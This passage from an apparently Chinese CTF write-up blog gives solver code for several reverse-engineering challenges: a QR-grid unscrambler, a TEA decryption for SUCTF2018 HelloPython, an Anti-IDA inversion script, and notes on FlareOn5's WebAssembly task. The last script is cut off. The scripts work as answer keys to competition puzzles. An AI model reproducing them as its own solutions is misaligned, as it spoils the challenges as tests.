class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="comment">// #include &lt;setimp.h&gt;</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">KeyList</span>&#123;</span></span><br><span class="line">    <span class="keyword">uint32_t</span> k1,k2,k3;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">KeyList</span>* <span class="title">next</span>;</span></span><br><span class="line">&#125; KeyList;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printArray</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *name,<span class="keyword">uint8_t</span> *v,<span class="keyword">size_t</span> len)</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;========%s=========\n&quot;</span>,name);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x%02X,&quot;</span>,v[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n=================\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">decrypt</span> <span class="params">(<span class="keyword">uint8_t</span> **data, KeyList*klp)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint8_t</span> v2,v3,*v4,*v5;</span><br><span class="line">    <span class="keyword">while</span>(klp-&gt;next)&#123;</span><br><span class="line">        <span class="keyword">switch</span>(klp-&gt;k3)&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">            v3=klp-&gt;k1<span class="number">-1</span>;</span><br><span class="line">            v2=klp-&gt;k2;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            v3=klp-&gt;k1+<span class="number">1</span>;</span><br><span class="line">            v2=klp-&gt;k2;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            v3=klp-&gt;k1;</span><br><span class="line">            v2=klp-&gt;k2<span class="number">-1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            v3=klp-&gt;k1;</span><br><span class="line">            v2=klp-&gt;k2+<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        v4=data[klp-&gt;k2];</span><br><span class="line">        v5=data[v2];</span><br><span class="line">        v4[klp-&gt;k1]+=v5[v3];</span><br><span class="line">        v5[v3]=v4[klp-&gt;k1]-v5[v3];</span><br><span class="line">        v4[klp-&gt;k1]-=v5[v3];</span><br><span class="line">        klp=klp-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">readKey</span><span class="params">(KeyList *klp)</span></span>&#123;</span><br><span class="line">    FILE *f = fopen(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">fscanf</span>(f,<span class="string">&quot;%d#(%d,%d)&quot;</span>,&amp;klp-&gt;k3,&amp;klp-&gt;k1,&amp;klp-&gt;k2)==<span class="number">3</span>)&#123;</span><br><span class="line">        klp-&gt;next=(KeyList*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(KeyList));</span><br><span class="line">        klp=klp-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    klp-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">    fclose(f);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">uint8_t</span>** <span class="title">readData</span><span class="params">()</span></span>&#123;</span><br><span class="line">    FILE *f = fopen(<span class="string">&quot;encrypted.qr&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">uint8_t</span> **data = (<span class="keyword">uint8_t</span> **)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>*)*<span class="number">25</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;<span class="number">25</span>;i++)&#123;</span><br><span class="line">        data[i] = (<span class="keyword">uint8_t</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">uint8_t</span>)*<span class="number">26</span>);</span><br><span class="line">        <span class="built_in">fscanf</span>(f,<span class="string">&quot;%s&quot;</span>,(<span class="keyword">char</span>*)data[i]);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">size_t</span> j=<span class="number">0</span>;j&lt;<span class="number">25</span>;j++)&#123;</span><br><span class="line">            data[i][j] -=<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(f);</span><br><span class="line">    <span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">writeData</span><span class="params">(<span class="keyword">uint8_t</span> **data)</span></span>&#123;</span><br><span class="line">    FILE *f = fopen(<span class="string">&quot;decrypted.qr&quot;</span>,<span class="string">&quot;w&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;<span class="number">25</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">size_t</span> j=<span class="number">0</span>;j&lt;<span class="number">25</span>;j++)&#123;</span><br><span class="line">            fputc(data[i][j]+<span class="string">&#x27;0&#x27;</span>,f);</span><br><span class="line">        &#125;</span><br><span class="line">        fputc(<span class="string">&#x27;\n&#x27;</span>,f);</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(f);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">uint8_t</span>**data=readData();</span><br><span class="line">    KeyList kl;</span><br><span class="line">    readKey(&amp;kl);</span><br><span class="line">    decrypt(data,&amp;kl);</span><br><span class="line">    writeData(data);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="rev-SUCTF2018-HelloPython"><a href="#rev-SUCTF2018-HelloPython" class="headerlink" title="[rev][SUCTF2018]HelloPython"></a>[rev][SUCTF2018]HelloPython</h2><p>tea加密，查看题目来源的题目描述得到密文</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="comment">// #include &lt;setimp.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printArray</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *name,<span class="keyword">uint8_t</span> *v,<span class="keyword">size_t</span> len)</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;========%s=========\n&quot;</span>,name);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x%02X,&quot;</span>,v[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n=================\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">encrypt</span> <span class="params">(<span class="keyword">uint32_t</span>* v, <span class="keyword">uint32_t</span>* k)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> v0=v[<span class="number">0</span>], v1=v[<span class="number">1</span>], sum=<span class="number">0</span>, i;           <span class="comment">/* set up */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> delta=<span class="number">0x9e3779b9</span>;                     <span class="comment">/* a key schedule constant */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> k0=k[<span class="number">0</span>], k1=k[<span class="number">1</span>], k2=k[<span class="number">2</span>], k3=k[<span class="number">3</span>];   <span class="comment">/* cache key */</span></span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;                       <span class="comment">/* basic cycle start */</span></span><br><span class="line">        sum += delta;</span><br><span class="line">        v0 += ((v1&lt;&lt;<span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;<span class="number">5</span>) + k1);</span><br><span class="line">        v1 += ((v0&lt;&lt;<span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;<span class="number">5</span>) + k3);  </span><br><span class="line">    &#125;                                              <span class="comment">/* end cycle */</span></span><br><span class="line">    v[<span class="number">0</span>]=v0; v[<span class="number">1</span>]=v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">decrypt</span> <span class="params">(<span class="keyword">uint32_t</span>* v, <span class="keyword">uint32_t</span>* k)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> v0=v[<span class="number">0</span>], v1=v[<span class="number">1</span>], sum=<span class="number">0xC6EF3720</span>, i;  <span class="comment">/* set up */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> delta=<span class="number">0x9e3779b9</span>;                     <span class="comment">/* a key schedule constant */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> k0=k[<span class="number">0</span>], k1=k[<span class="number">1</span>], k2=k[<span class="number">2</span>], k3=k[<span class="number">3</span>];   <span class="comment">/* cache key */</span></span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;<span class="number">32</span>; i++) &#123;                         <span class="comment">/* basic cycle start */</span></span><br><span class="line">        v1 -= ((v0&lt;&lt;<span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;<span class="number">5</span>) + k3);</span><br><span class="line">        v0 -= ((v1&lt;&lt;<span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;<span class="number">5</span>) + k1);</span><br><span class="line">        sum -= delta;                                   </span><br><span class="line">    &#125;                                              <span class="comment">/* end cycle */</span></span><br><span class="line">    v[<span class="number">0</span>]=v0; v[<span class="number">1</span>]=v1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> v[] = &#123;<span class="number">0xf1f5d29b</span>,<span class="number">0x6e4414ec</span>,&#125;;</span><br><span class="line">    <span class="keyword">uint32_t</span> k[] = &#123;<span class="number">3735928559</span>, <span class="number">590558003</span>, <span class="number">19088743</span>, <span class="number">4275878552</span>&#125;;</span><br><span class="line">    decrypt(v,k);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;flag&#123;%x_%x&#125;\n&quot;</span>,v[<span class="number">0</span>],v[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="rev-NPUCTF2020-Anti-IDA"><a href="#rev-NPUCTF2020-Anti-IDA" class="headerlink" title="[rev][NPUCTF2020]Anti-IDA"></a>[rev][NPUCTF2020]Anti-IDA</h2><p>从后往前逆向算法</p>
<ol>
<li>base16解码</li>
<li>翻转字符串得到targeta</li>
<li>根据targeta的范围可以确定dword_4321c0的范围，从而确定是sub_4015f0初始化dword_4321c0</li>
<li>根据计算v39=11</li>
<li>根据最大公约数确定dword_4324c0</li>
<li>后面一系列处理</li>
</ol>
<p>参考 <a target="_blank" rel="noopener" href="https://www.sqx-ub1sec.tech/ctfweb%E4%B8%93%E5%8C%BA/%E5%87%BA%E9%A2%98%E6%89%8B%E8%AE%B0">https://www.sqx-ub1sec.tech/ctfweb%E4%B8%93%E5%8C%BA/%E5%87%BA%E9%A2%98%E6%89%8B%E8%AE%B0</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding:utf-8</span></span><br><span class="line"></span><br><span class="line">target = <span class="string">&#x27;3D393A37343C39373A343A373D36363A3B3934333539363437373934383736373B38333D3D3D37313C3B3A36353C393437373C383E343434393B34343C37343E373B3C3938343C3C39383238373F36323C3C3933383939363535373A373535393F373D34373C343535393C39383336363B37333639353435393B3D313636363B35363833383D35333E3A3532383837353438373E373437343E34363A3D3A3233393939323735393A3D363B3B3736333B3C3436313F3C3D3435363537353739343A33343239383334363E3339373B373A3634373D3B3632373C3B35323D373732383739353435353A3834353538343934&#x27;</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getScope</span>(<span class="params">a</span>):</span></span><br><span class="line">    res = set()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">-128</span>,<span class="number">0x7f</span>):</span><br><span class="line">        res.add(i)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">        s = set()</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">-128</span>,<span class="number">0x7f</span>):</span><br><span class="line">            <span class="keyword">if</span> i-j&gt;=<span class="number">48</span> <span class="keyword">and</span> i-j &lt;<span class="number">58</span>:</span><br><span class="line">                s.add(j)</span><br><span class="line">        res&amp;=s</span><br><span class="line">    print(a,res)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line">targeta = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(target),<span class="number">2</span>):</span><br><span class="line">    targeta.append(int(target[i:i+<span class="number">2</span>],base=<span class="number">16</span>))</span><br><span class="line">print(targeta)</span><br><span class="line">targeta = targeta[::<span class="number">-1</span>]</span><br><span class="line">input1 = [<span class="number">0</span>]*len(targeta)</span><br><span class="line">inp_a4321c0 = [<span class="number">0</span>]*len(targeta)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(targeta)):</span><br><span class="line">    inp_a4321c0[i]=targeta[i]-(i%<span class="number">4</span>)</span><br><span class="line">print(inp_a4321c0)</span><br><span class="line"><span class="comment"># 根据输入的范围确定dword_4321c0</span></span><br><span class="line">scopes = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    a = []</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,len(inp_a4321c0),<span class="number">7</span>):</span><br><span class="line">        <span class="keyword">if</span> i+j&lt;len(inp_a4321c0):</span><br><span class="line">            a.append(inp_a4321c0[i+j])</span><br><span class="line">    scopes.append(getScope(a))</span><br><span class="line">print(scopes)</span><br><span class="line">a4321c0 = [<span class="number">4</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">2</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(targeta)):</span><br><span class="line">    input1[i] = inp_a4321c0[i]-a4321c0[i%<span class="number">7</span>]</span><br><span class="line">print(<span class="string">&#x27;len(input1)=&#x27;</span>,len(input1))</span><br><span class="line">input1 = str(bytes(input1),encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">input2 = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(input1),<span class="number">5</span>):</span><br><span class="line">    input2.append(int(input1[i:i+<span class="number">5</span>],base=<span class="number">10</span>))</span><br><span class="line">print(input2)</span><br><span class="line"><span class="comment"># for i in range(len(input2)):</span></span><br><span class="line"><span class="comment">#     input2[i]-=2*i+a4321c0[i%7]</span></span><br><span class="line"><span class="comment"># print(input2)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(input2)):</span><br><span class="line">    input2[i]-=i**<span class="number">2</span>-i</span><br><span class="line">a4324c0=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    a = input2[i]</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,len(input2),<span class="number">7</span>):</span><br><span class="line">        <span class="keyword">if</span> i+j&lt;len(input2):</span><br><span class="line">            a=gmpy2.gcd(input2[i+j],a)</span><br><span class="line">    a4324c0.append(a)</span><br><span class="line">print(a4324c0)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(input2)):</span><br><span class="line">    input2[i]//=a4324c0[i%<span class="number">7</span>]</span><br><span class="line">print(input2)</span><br><span class="line">a4322c0 = [<span class="number">0</span>]*<span class="number">6</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">    a4322c0[i]=<span class="number">2</span>*i+<span class="number">1</span></span><br><span class="line">decrypt = <span class="keyword">lambda</span> a1,a2:(a2%<span class="number">4</span>)^a4322c0[a2%<span class="number">6</span>]^a1</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(input2)):</span><br><span class="line">    input2[i]-=<span class="number">2</span>*i</span><br><span class="line">    input2[i] = decrypt(input2[i],i)</span><br><span class="line">    input2[i]-=a4321c0[i%<span class="number">7</span>]</span><br><span class="line">input2 = str(bytes(input2),encoding=<span class="string">&#x27;utf-8&#x27;</span>)[::<span class="number">-1</span>]</span><br><span class="line">print(input2)</span><br><span class="line">input3 = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(input2),<span class="number">2</span>):</span><br><span class="line">    input3.append(int(input2[i:i+<span class="number">2</span>],base=<span class="number">16</span>))</span><br><span class="line">print(len(input3),input3)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,len(input3)):</span><br><span class="line">    input3[i]-=input3[i<span class="number">-1</span>]</span><br><span class="line">    input3[i]+=<span class="number">0x100</span></span><br><span class="line">    input3[i]&amp;=<span class="number">0xff</span></span><br><span class="line">print(input3,bytes(input3))</span><br><span class="line">input3[<span class="number">23</span>]-=<span class="number">10</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(input3)<span class="number">-2</span>,<span class="number">-1</span>,<span class="number">-1</span>):</span><br><span class="line">    input3[i]-=input3[i+<span class="number">1</span>]</span><br><span class="line">    input3[i]+=<span class="number">0x100</span></span><br><span class="line">    input3[i]&amp;=<span class="number">0xff</span></span><br><span class="line">print(input3)</span><br><span class="line">print(bytes(input3))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(input3)):</span><br><span class="line">    input3[i]+=<span class="number">32</span></span><br><span class="line">    input3[i]+=<span class="number">0x100</span></span><br><span class="line">    input3[i]&amp;=<span class="number">0xff</span></span><br><span class="line">print(input3,bytes(input3))</span><br></pre></td></tr></table></figure>
<p>本来可以不看wp就对的，两处不认真 🌿</p>
<h2 id="rev-FlareOn5-web2-0"><a href="#rev-FlareOn5-web2-0" class="headerlink" title="[rev][FlareOn5]web2.0"></a>[rev][FlareOn5]web2.0</h2><p>参考 <a target="_blank" rel="noopener" href="https://www.fireeye.com/blog/threat-research/2018/10/2018-flare-on-challenge-solutions.html">https://www.fireeye.com/blog/threat-research/2018/10/2018-flare-on-challenge-solutions.html</a></p>
<p>webassembly</p>
<p>本来想用wabt先反编译成C再分析，可是似乎太麻烦了，于是寻找简单的做法</p>
<p>反编译成C后可以再回编译为可执行文件，然后用ida打开</p>
<p>也可以用webassembly studio <a target="_blank" rel="noopener" href="https://webassembly.studio/">https://webassembly.studio/</a></p>
<p>webassembly studio可以配合火狐的SpiderMokey插件查看Firefox的JIT过程，可以看到x86汇编代码的</p>
<p>ida有插件 <a target="_blank" rel="noopener" href="https://github.com/fireeye/idawasm">https://github.com/fireeye/idawasm</a></p>
<p><a target="_blank" rel="noopener" href="https://mbebenita.github.io/WasmExplorer/">https://mbebenita.github.io/WasmExplorer/</a> 这个工具似乎比studio好用不少</p>
<p><a target="_blank" rel="noopener" href="https://www.52pojie.cn/misc.php?mod=faq">https://www.52pojie.cn/misc.php?mod=faq</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding:utf-8</span></span><br><span class="line"></span><br><span class="line">a = [<span class="number">0xE4</span>, <span class="number">0x47</span>, <span class="number">0x30</span>, <span class="number">0x10</span>, <span class="number">0x61</span>, <span class="number">0x24</span>, <span class="number">0x52</span>, <span class="number">0x21</span>, <span class="number">0x86</span>, <span class="number">0x40</span>, <span class="number">0xAD</span>, <span class="number">0xC1</span>, <span class="number">0xA0</span>, <span class="number">0xB4</span>, <span class="number">0x50</span>, <span class="number">0x22</span>, <span class="number">0xD0</span>, <span class="number">0x75</span>, <span class="number">0x32</span>, <span class="number">0x48</span>, <span class="number">0x24</span>, <span class="number">0x86</span>, <span class="number">0xE3</span>, <span class="number">0x48</span>, <span class="number">0xA1</span>, <span class="number">0x85</span>, <span class="number">0x36</span>, <span class="number">0x6D</span>, <span class="number">0xCC</span>, <span class="number">0x33</span>, <span class="number">0x7B</span>, <span class="number">0x6E</span>, <span class="number">0x93</span>, <span class="number">0x7F</span>, <span class="number">0x73</span>, <span class="number">0x61</span>, <span class="number">0xA0</span>, <span class="number">0xF6</span>, <span class="number">0x86</span>, <span class="number">0xEA</span>, <span class="number">0x55</span>, <span class="number">0x48</span>, <span class="number">0x2A</span>, <span class="number">0xB3</span>, <span class="number">0xFF</span>, <span class="number">0x6F</span>, <span class="number">0x91</span>, <span class="number">0x90</span>, <span class="number">0xA1</span>, <span class="number">0x93</span>, <span class="number">0x70</span>, <span class="number">0x7A</span>, <span class="number">0x06</span>, <span class="number">0x2A</span>, <span class="number">0x6A</span>, <span class="number">0x66</span>, <span class="number">0x64</span>, <span class="number">0xCA</span>, <span class="number">0x94</span>, <span class="number">0x20</span>, <span class="number">0x4C</span>, <span class="number">0x10</span>, <span class="number">0x61</span>, <span class="number">0x53</span>, <span class="number">0x77</span>, <span class="number">0x72</span>, <span class="number">0x42</span>, <span class="number">0xE9</span>, <span class="number">0x8C</span>, <span class="number">0x30</span>, <span class="number">0x2D</span>, <span class="number">0xF3</span>, <span class="number">0x6F</span>, <span class="number">0x6F</span>, <span class="number">0xB1</span>, <span class="number">0x91</span>, <span class="number">0x65</span>, <span class="number">0x24</span>, <span class="number">0x0A</span>, <span class="number">0x14</span>, <span class="number">0x21</span>, <span class="number">0x42</span>, <span class="number">0xA3</span>, <span class="number">0xEF</span>, <span class="number">0x6F</span>, <span class="number">0x55</span>, <span class="number">0x97</span>, <span class="number">0xD6</span>]</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">cnt=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> cnt&lt;len(a):</span><br><span class="line">    op = a[cnt]&amp;<span class="number">0xf</span></span><br><span class="line">    res = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> op==<span class="number">0</span>:</span><br><span class="line">        res=a[cnt+<span class="number">1</span>]</span><br><span class="line">        cnt+=<span class="number">2</span></span><br><span class="line">    <span class="keyword">elif</span> op==<span class="number">1</span>:</span><br><span 